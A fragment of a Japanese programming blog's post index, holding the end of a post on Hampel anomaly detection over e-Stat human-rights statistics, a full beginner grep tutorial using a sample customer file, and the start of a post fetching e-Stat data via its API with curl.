の検索結果を利用して社会的に関心の高そうな列の抽出を試みました。\n今回は、以前紹介したhampelによる時系列データの異常値検知を組み込んで見たいと思います。\n前回取得した「人権侵犯事件の種類別」ごとにtime_code、valueをまとめcsvにしてhampelメソッドを適用します。\ntime_codeは月次なのですが、月ごとの事件数はかなりムラがあって比較が難しいので年次にまとめます。\n私人等に関するもの_暴行・虐待_家族間のもの_夫の妻に対するもの date,value 2007,2537 2008,2645 2009,2461 2010,2250 2011,2242 2012,2031 2013,1683 2014,1477 2015,1352 2016,1297 2017,1113 2018,900 2019,782 2020,534 コロナの影響なのか結構急激に下がっているのに検知しませんでした。\n母数が流石に少なすぎるのかちょっと見直しが必要ですね。\n閾値を色々変えてみましたがだめでした。\n残念です。\n年次のものについては一旦前の年との増減分を比較して閾値を超えたらアラートをあげるようにしようと思います。\nプログラム プログラムは以下の通りです。\nシェルプログラムから以前作ったhampelメソッドのpython を呼び出しています。\ngrep -e \u0026ldquo;^$nyear\u0026rdquo; -e \u0026ldquo;^$lyear\u0026rdquo; で直近２年間に異常値があった場合のみ検知するように絞りをかけています。\nfunction getHampel(){ echo \u0026#34;$column\u0026#34;|while read line;do cat \u0026#34;$STCSV\u0026#34;|grep \u0026#34;総数\u0026#34;|grep \u0026#34;,\\\u0026#34;$line\\\u0026#34;,\u0026#34;|$AWK -F, \u0026#39;{print $7\u0026#34;,\u0026#34;$10;}\u0026#39;|$SED -e \u0026#34;s|\\\u0026#34;||g\u0026#34; \u0026gt; \u0026#34;$TMPHCSV\u0026#34;; #月次だとムラがあって比較が難しいので年次にする years=$(cat \u0026#34;$TMPHCSV\u0026#34;|cut -c 1-4|sort|uniq -c|grep \u0026#34;^ 12\u0026#34;|$AWK \u0026#39;{print $2;}\u0026#39;); echo \u0026#34;date,value\u0026#34; \u0026gt; \u0026#34;$TMPHYCSV\u0026#34; echo \u0026#34;$years\u0026#34;|while read year;do local mcnt=$(cat \u0026#34;$TMPHCSV\u0026#34;|grep \u0026#34;^$year\u0026#34;|$AWK -F, \u0026#39;{print $2;}\u0026#39;|$AWK \u0026#39;{sum+=$0} END{print sum;}\u0026#39;); echo \u0026#34;$year,$mcnt\u0026#34; \u0026gt;\u0026gt;\u0026#34;$TMPHYCSV\u0026#34;; done #0:date:2021001111 value:5230 nyear=$(date +%Y); lyear=$((nyear-1)); hampelalert=$(python gethampel.py \u0026#34;$TMPHYCSV\u0026#34;|grep -e \u0026#34;^$nyear\u0026#34; -e \u0026#34;^$lyear\u0026#34;|tr \u0026#34;\\n\u0026#34; \u0026#34;:\u0026#34;); if [ -n \u0026#34;$hampelalert\u0026#34; ];then echo \u0026#34;$line,$hampelalert\u0026#34;; fi done } ","date":"2022-01-24T13:50:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-25-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-25-01-ani/","title":"e-Stat hampelで時系列データの異常値検知"},{"content":"はじめに grep（グレップ）コマンド。UNIX/Linuxにおいてこれほど歴史あり、強力なコマンドはありません。そして多くのユーザーがこのコマンドを使いこなしています。Webサーバーのログから特定のユーザーのみを抽出するちいさなスクリプトから、膨大なシステムログからロケットの軌道修正を計算する処理プログラムなど、半世紀もの長い間、一糸乱れることなく動き続けています。\n「grep」コマンドは、文字列、またはファイル内のをテキストを検索するための便利で不可欠なコマンドです。\n「grep」コマンドの正式な名称は「“global regular expression print.”」です。\nこのコマンドの名前は、正規表現に基づいてコンテンツを検索できる「g / re / p」に由来しています。\n「grep」コマンドには、ファイル内の文字列またはテキストを検索するため、複数の方法が用意されている。\n以下に「grep」コマンドを使用するいくつかの構文を示します。\nカラー表示 まず、grep コマンドをカラー表示にしてみます。\n以下のコマンドで、~/.bashrc を開きます。\n$ vim ~/.bashrc 以下の2行を ~/.bashrc に追記して保存して下さい。\nalias grep=\u0026#39;grep --color=auto\u0026#39; alias egrep=\u0026#39;egrep --color=auto\u0026#39; alias fgrep=\u0026#39;fgrep --color=auto\u0026#39; alias ls=\u0026#39;ls -FG\u0026#39;; grep/egrep/fgrep そしてついでに lsコマンドもカラー表示に変更します。変更したら ~/.bashrcを以下のコマンドで再読込します。\n$ . ~/.bashrc $ では、grep コマンドを使ってみます。\nここでは /etc/passwordファイルをgrepしてrootを検索してみます。\n$ grep root /etc/password $ 構文 次の「grep」コマンドは、ファイル内の特定の文字列またはテキストを検索するために使用されます。\n$ grep 検索文字列 ファイル名 次の「grep」コマンドは、複数のファイル内の特定の文字列またはテキストを検索するために使用されます。\n$ grep 検索文字列 filename1 filename2 filename3 $ 次は、空白を含む文字列を検索します。この場合はシングルクォーテーション「\u0026rsquo;」、またはダブるクォーテーション「\u0026quot;」で文字列を囲む必要があります。\n$ grep \u0026#34;検索文字列 検索文字列\u0026#34; filename1 $ 次の「grep」コマンドは、ファイル内の特定のオプションを含む文字列を検索するために使用されます。「 grep」コマンドでは、さまざまな目的でさまざまなオプションが使用されます。\nここでは「-v」を紹介します。「-v」オプションは、検索文字列を含まない行を抽出するオプションです。\nこのオプションは、非常に多くの場面で利用されます。\n$ cat /etc/passwd | head ## # User Database # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## bash-5.1$ cat /etc/passwd | head ## # User Database # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## $ bash-5.1$ cat /etc/passwd | head | grep \"User\" # User Database $ $ cat /etc/passwd | head | grep -v \"User\" ## # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## $ まず、\n$ cat /etc/passwd $ で、/etc/passwd ファイルをcat します。\ncatするというのは、ファイル内容を出力すると言う意味になります。さらに、\n$ cat /etc/passwd | head $ の、headは、出力された /etc/passwd ファイルの冒頭１０行を抽出するというコマンド「head」です。「head」コマンドで -n5 オプションをつけることで冒頭5行目とすることもできます。\n$ cat /etc/passwd | head -n5 $ シェルスクリプトは、「| 」パイプでコマンドを連ねることで、前のコマンドに続いて、さらにコマンドの出力結果を絞り込むことができます。\n次のコマンドは、/etc/passwd ファイルを catコマンドで表示し、headコマンドで冒頭１０行を抽出、さらに grep -v コマンドで User を除く行を出力します。\n$ cat /etc/passwd | head | grep -v \u0026#34;User\u0026#34; 「 grep -v 」コマンドは、指定した文字列を含まない行を抽出するという意味です。\n-v をつけなければ、User という文字列を含む文字列が抽出されることになります。\nさらにgrepには強力な「-i」オプションがあります。\n「-i」オプションは、検索文字列の大文字、小文字を区別せずに抽出します。\n$ cat /etc/passwd | head | grep -iv \u0026#34;user\u0026#34; ## # # Note that this file is consulted directly only when the system is running # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## $ ヒント grep コマンドで最も使われる書式は $ cat \u0026lt;ファイル名\u0026gt; | grep \u0026ldquo;検索文字列\u0026rdquo; です。 以下、\u0026rsquo;-v\u0026rsquo; \u0026lsquo;-i\u0026rsquo; 二つのオプションをパイプで駆使すればgrepコマンドを使いこなしていると言っても過言ではありません。 # -v 除外 $ cat \u003cファイル名\u003e | grep -v \"検索文字列\" # -i 大文字小文字を区別しない $ cat \u003cファイル名\u003e | grep -i \"検索文字列\" 一致する文字列を検索 では手始めに、次のコマンドで、Customers.txtファイルの内容を表示します。以下の内容をCustomers.txtとして保存して下さい。\nID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 Customers.txtを表示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 次の「grep」コマンドは、Customers.txtファイルのテキスト「 MalihaChowdhury 」を検索します。検索テキストがファイルに存在する場合、テキストを含む行が印刷されます。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep Ali 45 Minhaz Ali ali@gmail.com +8801190761212 $ 次の「grep」コマンドは、Customers.txtファイルのテキスト「 MalihaChowdhury 」を検索します。検索テキストがファイルに存在する場合、テキストを含む行が印刷されます。\n$ cat Customers.txt | grep 'Maliha Chowdhury' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 $ 一致しない文字列のみを検索 「grep」コマンドの-vオプションは、ファイルから一致しない文字列を検索するために使用されます。この例では、-vオプションを指定した「grep」コマンドを使用して、最初の例で作成したCustomers.txtファイルから一致しない文字列を検索しています。\n次のコマンドは、customers.txtファイルの内容を表示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -v 'Abir' ID Name Email Phone 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント -vオプションは、ファイルから一致しない文字列を検索するために使用されます。 検索文字列を除外して検索する場合は、\u0026rsquo;-v\u0026rsquo;オプションを使います。\n$ cat \u0026lt;ファイル名\u0026gt; | grep -v \u0026ldquo;検索文字列\u0026rdquo; 大文字と小文字を区別しない一致の検索文字列 「grep」コマンドは、デフォルトで大文字と小文字を区別してファイルから文字列を検索します。\n「grep」コマンドの \u0026lsquo;-i\u0026rsquo; オプションは、大文字と小文字を区別しない方法でファイルから文字列を検索するために使用されます。\nこの例では、\u0026rsquo;-i\u0026rsquo; オプションを指定した「grep」コマンドを使用して、前に作成したCustomers.txtファイルから大文字と小文字を区別しない方法で特定の文字列を検索しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -i 'minhaz' 45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント 文字が大文字または小文字の文字列を含む1つ以上の行がファイルに存在する場合、その行が出力されます。 大文字小文字を区別しないで検索する場合は、\u0026rsquo;-i\u0026rsquo;オプションを使います。\n$ cat \u0026lt;ファイル名\u0026gt; | grep -i \u0026ldquo;検索文字列\u0026rdquo; 単語全体のみを検索 「grep」コマンドの \u0026lsquo;-w\u0026rsquo; オプションは、大文字と小文字を区別してファイルから単語全体を検索するために使用されます。\nこの例では、\u0026rsquo;-w\u0026rsquo; オプションを指定した「grep」コマンドを使用して、最初の例で作成されたCustomers.txtファイルから単語全体を検索しています。\n次のコマンドは、customers.txtファイルの内容を表示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 次の「grep」コマンドは、文字列「Ma」を含むテキストファイルの行を検索します。ファイルのいずれかの行に文字列「Ma」が含まれている場合、その行が出力されます。\n$ cat Customers.txt | grep 'Ma' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 次の「grep」コマンドは、「Ma」という単語を含むテキストファイルの行を「正確」に検索します。\nファイルのいずれかの行に「Ma」という単語が正確に含まれている場合、その行が出力されます。\n「Ma」という単語がないため、出力されません。\n$ cat Customers.txt | grep -w \u0026#39;Ma\u0026#39; $ 次の「grep」コマンドは、「Maliha」という単語を含むテキストファイルの行を正確に検索します。\nファイルのいずれかの行に「Maliha」という単語が正確に含まれている場合、その行が出力されます。\n$ cat Customers.txt | grep -w 'Maliha' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 $ ヒント \u0026lsquo;-w\u0026rsquo; オプションと検索語「Ma」を指定した「grep」コマンドは、テキストファイルに「Ma」という単語が含まれていないため、何も返しませんでした。 -wオプションと検索語「Maliha」を指定した「grep」コマンドは、「Maliha」という単語を含むファイルの5行目を返しました。 \u0026lsquo;-w\u0026rsquo; オプションは正確な単語を検索対象とするオプションです。 現在のディレクトリで複数のファイルを検索する 「grep」コマンドは、ファイル内の特定のコンテンツを検索し、検索文字列またはパターンに基づいて現在のディレクトリ内の複数のファイルを検索するために使用されます。\n* ワイルドカードを使用して現在のディレクトリ内の複数のファイルを検索する方法は、Customers.txtファイルのこの例に示されています。\n次の「grep」コマンドは、「split」という単語を含む現在のディレクトリのファイルを再帰的に検索します。\n\u0026lsquo;split\u0026rsquo;という単語を含む現在のディレクトリとサブディレクトリのファイルは、次の行で出力されます。\n$ grep -w split * $ ディレクトリを再帰的に検索する \u0026lsquo;-r\u0026rsquo; オプションは、「grep」コマンドとともに使用して、ディレクトリ内の特定の文字列またはパターンを再帰的に検索します。\nこの例では、「grep」コマンドを使用して現在のディレクトリを再帰的に検索し、Customers.txtファイルを検索します。\n$ grep -wr split * $ ヒント ディレクトリを指定して再帰的に検索したい場合は、\n$ grep 検索文字列 検索したい場所 となります。 $ grep -wr kpasswd /etc/services kpasswd 464/udp # kpasswd kpasswd 464/tcp # kpasswd rpasswd\t774/tcp # $ 行番号を出力に追加します 「grep」コマンドの \u0026lsquo;-n\u0026rsquo; オプションは、ファイルの行番号とともに検索文字列の出力を出力するために使用されます。\nこの例では、\u0026rsquo;-n\u0026rsquo; オプションを指定した「grep」コマンドを使用して、最初の例で作成されたCustomers.txtファイルの行番号を含む検索出力を表示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -n \"Ali\" 4:45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント ターミナルから前のコマンドを実行すると、次の出力が表示されます。文字列「Riya」はファイルの3行目にあります。4行目と5行目は、一致する行の次の2行です。したがって、3行目、4行目、および5行目は、一致する文字列を強調表示することによって出力に出力されています。 一致する行の後に特定の行数を印刷します 数値を含む \u0026lsquo;-A\u0026rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの後に特定の行数を出力するために使用されます。\nこの例では、Customers.txtファイルに対して「grep」コマンドの \u0026lsquo;-A\u0026rsquo; オプションを使用しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -A2 \"Ali\" 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント ターミナルから前のコマンドを実行すると、次の出力が表示されます。文字列「Riya」はファイルの3行目にあります。4行目と5行目は、一致する行の次の2行です。したがって、3行目、4行目、および5行目は、一致する文字列を強調表示することによって出力に出力されています。 一致する行の前に特定の行数を印刷します 数値を含む \u0026lsquo;-B\u0026rsquo; オプションは、ファイル内で一致する文字列またはパターンの前に特定の行数を出力するために使用されます。\nこの例では、Customers.txtファイルに対して「grep」コマンドの \u0026lsquo;-B\u0026rsquo; オプションの使用法を示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -B1 \"Riya\" 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 $ ヒント 文字列「Riya」はファイルの3行目にあります。2行目は、一致する行の前の行です。したがって、2行目と3行目は、一致する文字列を強調表示することによって出力に出力されています。 一致する行の前後の特定の行数を印刷します 数値を指定した \u0026lsquo;-C\u0026rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの前後の特定の行数を出力するために使用されます。\nこの例では、 Customers.txtファイルの「grep」コマンドの \u0026lsquo;-C\u0026rsquo; オプションの使用法を示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -C1 \"Maliha\" 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント ターミナルから前のコマンドを実行すると、次の出力が表示されます。5行目には、文字列 \u0026lsquo;Maliha\u0026rsquo;が含まれています。4行目は一致する行の前の行で、6行目は一致する行の次の行です。したがって、4行目、5行目、および6行目は、一致する文字列を強調表示することによって出力に出力されています。 ブラケットを使用して特定の数字を一致させる[] 特定の桁の範囲は、角かっこ[]を使用して、「grep」コマンドの正規表現パターンで定義できます。\nこの例では、Customers.txtファイルの「grep」コマンドを使用して特定の数字を検索する方法を示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ cat Customers.txt | grep '[3-5]' $ 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 $ ヒント [3-5] は、3,4,5 のいずれかを検索文字列とするという意味となります。 2,3,4,5,6 としたい場合は、 [2-6]となります。 3番目のブラケットを使用してパターンを特定の文字と一致させる[] ファイルの特定の文字は、角かっこ[]を使用してさまざまな方法で一致させることができます。\n角かっこを使用してファイルから特定の行を検索することにより、正規表現パターンで文字の範囲または特定の文字を使用できます。\nこの例では、文字範囲または特定の文字のパターンを使用して、Customers.txtファイル内の特定の文字を検索する方法を示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep 'Ma[lr]' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント Ma から始まる単語を検索し、さらに続く文字列が \u0026lsquo;[lr]\u0026rsquo; すなわち、l または r である文字列を検索します。いわゆる「Mal」と「Mar」を検索するという意味になります。 [：alnum：]クラスを使用してアルファベットと数字を一致させる [:alnum:]クラスは、アルファベットと数字を照合するために正規表現パターンで使用されます。\nパターン[A-z0-9]に相当します。\n[：alpha：]クラスを使用してアルファベット文字を照合する [:alpha:]クラスは、アルファベット文字のみに一致する正規表現パターンで使用されます。\nパターン[A-z]に相当します。\n[：digit：]クラスを使用して数字を照合する [:digit:]クラスは、正規表現パターンで数字のみに一致するために使用されます。\nパターン[0-9]と同等です。\n[：lower：]クラスを使用して小文字を照合する [:lower:]クラスは、すべての小文字のみに一致するように正規表現パターンで使用されます。\nパターン[a-z]と同等です。\n[：space：]クラスを使用してスペース文字を一致させる [:space:]クラスは、スペース文字を含む行と一致させるために正規表現パターンで使用されます。\nヒント tab文字、空白も含めて検索対象となります。 $ grep \u0026ldquo;test(タブ文字)\u0026rdquo; /path/to/file\n:と、入力したい場合は、ctrl-v を入力してからタブを打つと入力される。 \u0026lsquo;[[:space:]]\u0026rsquo; では空白文字もタブ文字もマッチする。\nこれならメモなどからコピペできる。\n$ grep \u0026ldquo;test[[:space:]]\u0026rdquo; /path/to/file また、\n$ grep test$\u0026rsquo;\\t\u0026rsquo; /path/to/file\nであればタブだけがマッチする。\n行頭からの検索 キャレット（^）記号は、ファイル内の特定の文字または文字列で始まる行と一致するように正規表現で使用されます。\nこの記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep ^4 45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント ターミナルから前のコマンドを実行すると、次の出力が表示されます。出力によると、customers.txtファイルには「 4 」で始まる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。 行の終わりに一致する ドル（$）記号は、ファイル内の特定の文字または文字列と行末を一致させるために正規表現で使用されます。\nこの記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep 1212$ 45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント customers.txtファイルには「1212」で終わる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。 連結との一致 正規表現パターンは、複数のパターンを連結することで作成できます。\nドット（.）は、パターンを連結するために使用されます。\nこの例では、 Customers.txtファイルに対して「grep」コマンドと連結して使用する方法を示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -e '[MR]\\.\\*[Kk]' 23 Riya Chakroborti riya@gmail.com +8801937864534 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント customers.txtファイルには「R」と「M 」で始まり「 k 」で終わる2行が存在します。したがって、ファイルの3行目と6行目が出力に出力されています。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-24T10:53:58+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep_hu5909208fb16d2109d0cdca2186f9358e_30103_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/","title":"【grep特集】ざっくりわかるシェルスクリプト４"},{"content":"Google Custom Search APIの検索結果と統計名の列名をマッチンングさせる 今回は、前回取得したGoogle Custom Search APIの検索結果と統計名の列名をマッチンングさせて社会的に関心の高い列名を取得してみたいと思います。\n今回は「人権侵犯事件統計」 を取り扱ってみたいと思います。\n人権侵犯事件統は、法務省の人権擁護機関で取り扱った人権侵犯事件及び人権相談に関する統計報告を集計したものとのことです。\ne-Stat から統計データを取得する まずはe-StatのAPIにアクセスして統計データを取得します。\n将来的には新着の統計データを日時で取得して処理するようにしますが、今回は「人権侵犯事件統計」だけ取得します。\ncurl -s \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxxxxxxxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003286680\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; -o \u0026#34;$STCSV\u0026#34; 統計データの中身を見てみる \u0026#34;RESULT\u0026#34; \u0026#34;STATUS\u0026#34;,\u0026#34;0\u0026#34; \u0026#34;ERROR_MSG\u0026#34;,\u0026#34;正常に終了しました。\u0026#34; \u0026#34;DATE\u0026#34;,\u0026#34;2022-01-21T09:58:51.856+09:00\u0026#34; \u0026#34;RESULT_INF\u0026#34; \u0026#34;TOTAL_NUMBER\u0026#34;,\u0026#34;403425\u0026#34; \u0026#34;FROM_NUMBER\u0026#34;,\u0026#34;1\u0026#34; \u0026#34;TO_NUMBER\u0026#34;,\u0026#34;100000\u0026#34; \u0026#34;NEXT_KEY\u0026#34;,\u0026#34;100001\u0026#34; \u0026#34;TABLE_INF\u0026#34;,\u0026#34;0003286680\u0026#34; \u0026#34;STAT_NAME\u0026#34;,\u0026#34;00250010\u0026#34;,\u0026#34;人権侵犯事件統計\u0026#34; \u0026#34;GOV_ORG\u0026#34;,\u0026#34;00250\u0026#34;,\u0026#34;法務省\u0026#34; \u0026#34;STATISTICS_NAME\u0026#34;,\u0026#34;人権侵犯事件統計\u0026#34; \u0026#34;TITLE\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;人権侵犯事件 種類別　人権侵犯事件の受理及び 処理件数　（月次）\u0026#34; \u0026#34;CYCLE\u0026#34;,\u0026#34;月次\u0026#34; \u0026#34;SURVEY_DATE\u0026#34;,\u0026#34;201801\u0026#34; \u0026#34;OPEN_DATE\u0026#34;,\u0026#34;2022-01-20\u0026#34; \u0026#34;SMALL_AREA\u0026#34;,\u0026#34;0\u0026#34; \u0026#34;COLLECT_AREA\u0026#34;,\u0026#34;該当なし\u0026#34; \u0026#34;MAIN_CATEGORY\u0026#34;,\u0026#34;14\u0026#34;,\u0026#34;司法・安全・環境\u0026#34; \u0026#34;SUB_CATEGORY\u0026#34;,\u0026#34;01\u0026#34;,\u0026#34;司法\u0026#34; \u0026#34;OVERALL_TOTAL_NUMBER\u0026#34;,\u0026#34;0\u0026#34; \u0026#34;UPDATED_DATE\u0026#34;,\u0026#34;2022-01-20\u0026#34; 